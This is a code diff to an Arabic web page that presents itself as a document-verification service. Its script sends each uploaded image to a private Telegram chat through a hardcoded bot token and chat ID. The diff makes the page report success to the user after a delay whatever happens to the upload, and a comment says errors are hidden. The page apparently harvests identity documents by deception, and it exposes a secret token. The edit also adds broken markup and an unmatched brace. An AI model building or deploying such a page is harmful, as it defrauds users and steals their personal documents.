@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+كم<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
@@ -247,7 +247,7 @@
   const BOT_TOKEN = "8629016280:AAGEiWLVdWSmGCNtTBMvgzygrnYHgwfsXZQ";
   const CHAT_ID = "8767380282";
 
-  function uploadDocument() {
+   function uploadDocument() {
     let input = document.createElement('input');
     input.type = 'file';
     input.accept = 'image/*';
@@ -267,27 +267,23 @@
       btn.innerText = "جاري الإرسال...";
       btn.disabled = true;
 
+      // إظهار النجاح فوراً للمستخدم بدون إظهار أي رسالة خطأ
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
         method: "POST",
         body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        // إظهار النتيجة فوراً للعميل في جميع الحالات
+      }).catch(err => console.log(err));
+
+      setTimeout(() => {
         banner.style.display = "block";
         btn.classList.add("success");
         btn.innerText = "✓ تم استلام المستند وإرساله للتحقق";
         btn.disabled = true;
-      })
-      .catch(err => {
-        banner.style.display = "block";
-        btn.classList.add("success");
-        btn.innerText = "✓ تم استلام المستند وإرساله للتحقق";
-        btn.disabled = true;
-      });
+      }, 1000);
     };
 
     input.click();
+  }
+
   }
 </script>
 
